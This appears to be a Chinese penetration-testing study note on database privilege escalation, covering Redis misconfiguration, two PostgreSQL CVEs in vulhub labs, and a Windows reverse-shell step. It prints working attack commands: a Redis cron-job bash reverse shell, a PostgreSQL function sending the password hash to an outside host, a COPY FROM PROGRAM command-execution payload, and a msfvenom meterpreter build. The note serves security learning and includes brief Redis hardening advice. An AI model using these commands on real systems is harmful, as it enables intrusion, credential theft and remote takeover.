<a name="fHSXe"></a>
# 一、思维导图
![](https://cdn.nlark.com/yuque/0/2022/webp/2476579/1648298894641-f4aa503b-ef98-4b39-b824-dd5887001711.webp#clientId=u703068a6-6f6c-4&from=paste&id=u1047c4d3&originHeight=1335&originWidth=942&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u182e7070-4451-4dbf-8b93-b7b3cc867d1&title=)
```vue
在利用系统溢出漏洞无果的情况下，可以采用数据库进行提权，但需要知道数据库提权的前提条件：
服务器开启数据库服务及获取到最高权限用户密码。除 Access 数据库外，其他数据库基本都存在数
据库提权的可能。
#数据库应用提权在权限提升中的意义
#WEB 或本地环境如何探针数据库应用
#数据库提权权限用户密码收集等方法
#目前数据库提权对应的技术及方法等
```
<a name="kKndM"></a>
# 二、Redis数据库权限提升

Redis服务因配置不当，可被攻击者恶意利用。黑客借助Redis内置命令，可将现有数据恶意清空；如果Redis以root身份运行，黑客可往服务器上写入SSH公钥文件，直接登录服务器。

<a name="hSxf9"></a>
## 2-1提权方法：

连接(未授权漏洞或密码)-利用如下方法提权

参考：[https://blog.csdn.net/fly_hps/article/details/80937837](https://blog.csdn.net/fly_hps/article/details/80937837)

(1).利用计划任务执行命令反弹shell

(2).写ssh-keygen公钥然后使用私钥登陆

(3).权限较低往web物理路径写webshell

<a name="lcpT4"></a>
## 2-2修复方案：

注意：以下操作，均需重启Redis后才能生效。

绑定需要访问数据库的IP。将127.0.0.1修改为需要访问此数据库的IP地址。

设置访问密码。在Redis.conf中requirepass字段后，设置添加访问密码。

修改Redis服务运行账号。以较低权限账号运行Redis服务，禁用账号的登录权限。 

<a name="k5Utw"></a>
## 2-3Redis连接-利用计划任务执行命令反弹shell

连接redis：

    redis-cli -h IP地址（如果是本地数据库填127.0.0.1）

执行提权命令：

    set x "\n* * * * * bash -i >& /dev/tcp/监听IP地址/端口号 0>&1\n"

    config set dir /var/spool/cron/

    config set dbfilename root

    save 
<a name="pFLcU"></a>
# 三、postgresql提权
<a name="YLexE"></a>
## 3-1、CVE-2018-1058/
[https://vulhub.org/#/environments/postgres/CVE-2018-1058/](https://vulhub.org/#/environments/postgres/CVE-2018-1058/)
```shell
root@ubuntu:# cd /opt/vulhub/vulhub-master/postgres/CVE-2018-1058
root@ubuntu:/opt/vulhub/vulhub-master/postgres/CVE-2018-1058# docker-compose up -d
root@ubuntu:/opt/vulhub/vulhub-master/postgres/CVE-2018-1058# docker exec -it cve-2018-1058_postgres_1 /bin/bash
bash-4.3# psql --host 127.0.0.1 --username vulhub
vulhub=> CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$
vulhub$>     select dblink_connect((select 'hostaddr=10.1.1.3 port=5433 user=postgres password=chybeta sslmode=disable dbname='||(SELECT passwd FROM pg_shadow WHERE usename='postgres')));
vulhub$>     SELECT pg_catalog.array_to_string($1,$2);
vulhub$> $$ LANGUAGE SQL VOLATILE;
root@ubuntu:/opt/vulhub/vulhub-master/postgres/CVE-2018-1058# docker-compose exec postgres pg_dump -U postgres -f evil.bak vulhub
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648519931596-681f19a5-dd05-4974-bfc1-cc0fc21afd72.png#clientId=u4ead3a93-fcf7-4&from=paste&height=153&id=u37986e27&originHeight=191&originWidth=663&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18968&status=done&style=none&taskId=u9d4616c3-094a-42f8-83e4-9aaddb4eee5&title=&width=530.4)
<a name="qwfHR"></a>
## 3-2、CVE-2019-9193
[https://vulhub.org/#/environments/postgres/CVE-2019-9193/](https://vulhub.org/#/environments/postgres/CVE-2019-9193/)<br />payload
```vue
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648521282290-cedf64a3-1742-4252-807a-16c21842c89b.png#clientId=u4ead3a93-fcf7-4&from=paste&height=306&id=u3b3ca9d2&originHeight=383&originWidth=1160&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37523&status=done&style=none&taskId=uff07fb49-1bcc-4178-b7b6-5da609376ad&title=&width=928)
<a name="Zf2Pn"></a>
# 四、win7/ser08令牌窃取
msf生成反弹shell<br />` msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.1.1.3 LPORT=5555 -f exe > shell.exe ``其中lhost和lport可以理解为**攻击机**的ip地址和端口号`









